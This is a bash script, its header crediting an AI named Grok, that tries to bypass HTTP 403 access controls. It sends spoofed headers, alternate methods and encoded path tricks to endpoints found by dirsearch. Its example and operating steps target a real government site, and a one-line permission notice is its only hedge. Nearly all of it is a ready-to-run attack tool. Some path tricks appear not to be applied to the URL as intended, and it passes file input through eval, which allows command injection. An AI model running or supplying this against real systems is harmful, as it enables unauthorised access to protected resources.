#!/bin/bash

# ================================================
# 403 BYPASS SCRIPT - CURL BASED
# Author: Grok (with team input)
# Purpose: Bypass 403 Forbidden on endpoints discovered via dirsearch
# Features:
#   - Takes main URL + endpoints file (one per line)
#   - Tries ALL common bypass methods (methods, headers, path tricks, encodings)
#   - Color-coded output + saves results to bypass_results.txt
# ================================================

# Colors for nice output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Default values
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"

# Usage
usage() {
    echo -e "${YELLOW}Usage:${NC}"
    echo -e "  $0 -u <BASE_URL> -e <ENDPOINTS_FILE> [-t <TIMEOUT>] [-h]"
    echo ""
    echo -e "${CYAN}Example:${NC}"
    echo -e "  $0 -u https://techport.nasa.gov -e dirsearch_results.txt"
    echo ""
    echo -e "${YELLOW}How to operate:${NC}"
    echo -e "1. Run dirsearch first: ${BLUE}dirsearch -u https://techport.nasa.gov -e * --output dirsearch_results.txt${NC}"
    echo -e "2. Then run this script with the flags above."
    echo -e "3. Results saved to ${GREEN}bypass_results.txt${NC}"
    echo ""
    echo -e "${RED}Note:${NC} Use only on targets you have permission to test!"
    exit 1
}

# Parse arguments
TIMEOUT=10
while getopts "u:e:t:h" opt; do
    case $opt in
        u) BASE_URL="$OPTARG" ;;
        e) ENDPOINTS_FILE="$OPTARG" ;;
        t) TIMEOUT="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

# Validate inputs
if [ -z "$BASE_URL" ] || [ -z "$ENDPOINTS_FILE" ]; then
    usage
fi

if [ ! -f "$ENDPOINTS_FILE" ]; then
    echo -e "${RED}Error: Endpoints file '$ENDPOINTS_FILE' not found!${NC}"
    exit 1
fi

# Clean base URL (remove trailing slash)
BASE_URL="${BASE_URL%/}"

# Clear previous results
RESULTS_FILE="bypass_results.txt"
echo -e "=== 403 BYPASS RESULTS - $(date) ===\n" > "$RESULTS_FILE"

echo -e "${CYAN}===================================================${NC}"
echo -e "${GREEN}403 BYPASS SCRIPT STARTED${NC}"
echo -e "${CYAN}Base URL : ${BLUE}$BASE_URL${NC}"
echo -e "${CYAN}Endpoints: ${BLUE}$ENDPOINTS_FILE${NC}"
echo -e "${CYAN}Timeout  : ${BLUE}${TIMEOUT}s${NC}"
echo -e "${CYAN}===================================================${NC}\n"

# Array of ALL bypass techniques
declare -a BYPASSES=(
    # 1. Different HTTP Methods
    "GET|standard|"
    "HEAD|head-method|"
    "POST|post-empty|-X POST -d ''"
    "OPTIONS|options-method|-X OPTIONS"
    "TRACE|trace-method|-X TRACE"
    "PUT|put-method|-X PUT -d ''"

    # 2. Common Bypass Headers
    "GET|X-Forwarded-For:127.0.0.1|-H 'X-Forwarded-For: 127.0.0.1'"
    "GET|X-Original-URL|-H 'X-Original-URL: %PATH%'"
    "GET|X-Rewrite-URL|-H 'X-Rewrite-URL: %PATH%'"
    "GET|X-Custom-IP-Authorization:127.0.0.1|-H 'X-Custom-IP-Authorization: 127.0.0.1'"
    "GET|X-Forwarded-Host|-H 'X-Forwarded-Host: localhost'"
    "GET|Referer|-H 'Referer: $BASE_URL'"
    "GET|User-Agent-Override|-H 'User-Agent: $USER_AGENT'"

    # 3. Path Manipulation Tricks
    "GET|Trailing-Slash|%PATH%/"
    "GET|Double-Slash|//%PATH%"
    "GET|Dot-Slash|/./%PATH%"
    "GET|Dot-Dot-Slash|/../%PATH%"
    "GET|Encoded-Slash|%2f%PATH%"
    "GET|Double-Encoded|%252f%PATH%"
    "GET|Null-Byte|%PATH%%00"
    "GET|JSON-Content-Type|-H 'Content-Type: application/json'"

    # 4. Special Combinations (most powerful)
    "GET|X-Forwarded-For+Original-URL|-H 'X-Forwarded-For: 127.0.0.1' -H 'X-Original-URL: %PATH%'"
    "GET|X-Forwarded-For+Rewrite-URL|-H 'X-Forwarded-For: 127.0.0.1' -H 'X-Rewrite-URL: %PATH%'"
)

# Main loop
counter=0
success_count=0

while IFS= read -r endpoint || [ -n "$endpoint" ]; do
    # Skip empty lines and comments
    [[ -z "$endpoint" || "$endpoint" =~ ^# ]] && continue
    
    # Clean endpoint (remove leading slash if needed, but keep it)
    endpoint="${endpoint#/}"
    full_base="$BASE_URL/$endpoint"
    
    counter=$((counter+1))
    echo -e "${YELLOW}[$counter] Testing: $full_base${NC}"
    
    for bypass in "${BYPASSES[@]}"; do
        IFS='|' read -r method name curl_opts <<< "$bypass"
        
        # Replace %PATH% placeholder with actual endpoint
        curl_opts="${curl_opts//%PATH%/$endpoint}"
        
        # Build curl command
        curl_cmd="curl -s -o /dev/null -w '%{http_code}' -k --max-time $TIMEOUT "
        curl_cmd+="$curl_opts "
        curl_cmd+="-H 'User-Agent: $USER_AGENT' "
        curl_cmd+="'$full_base'"
        
        # Execute
        http_code=$(eval $curl_cmd 2>/dev/null)
        
        if [ "$http_code" = "200" ] || [ "$http_code" = "201" ] || [ "$http_code" = "204" ] || [ "$http_code" = "301" ] || [ "$http_code" = "302" ]; then
            echo -e "   ${GREEN}✓ SUCCESS${NC} | $method | $name | Code: ${GREEN}$http_code${NC}"
            echo -e "SUCCESS | $full_base | Method: $method | Bypass: $name | Code: $http_code" >> "$RESULTS_FILE"
            success_count=$((success_count+1))
            break  # Stop after first successful bypass (you can remove this if you want ALL)
        elif [ "$http_code" = "403" ]; then
            echo -e "   ${RED}✗ Still 403${NC} | $method | $name"
        else
            echo -e "   ${BLUE}* Other code${NC} | $method | $name | Code: $http_code"
        fi
    done
done < "$ENDPOINTS_FILE"

echo -e "\n${CYAN}===================================================${NC}"
echo -e "${GREEN}FINISHED!${NC} Tested $counter endpoints."
echo -e "${GREEN}Successful bypasses: $success_count${NC}"
echo -e "${CYAN}Full results saved to: ${GREEN}$RESULTS_FILE${NC}"
echo -e "${CYAN}===================================================${NC}"

# Show how to view results
echo -e "\n${YELLOW}Commands to operate:${NC}"
echo -e "1. Run dirsearch → dirsearch -u $BASE_URL -e * -o dirsearch_results.txt"
echo -e "2. Run this script → ./bypass_403.sh -u $BASE_URL -e dirsearch_results.txt"
echo -e "3. View results   → cat bypass_results.txt | grep SUCCESS"
echo -e "4. Re-run with longer timeout → ./bypass_403.sh -u $BASE_URL -e dirsearch_results.txt -t 15"
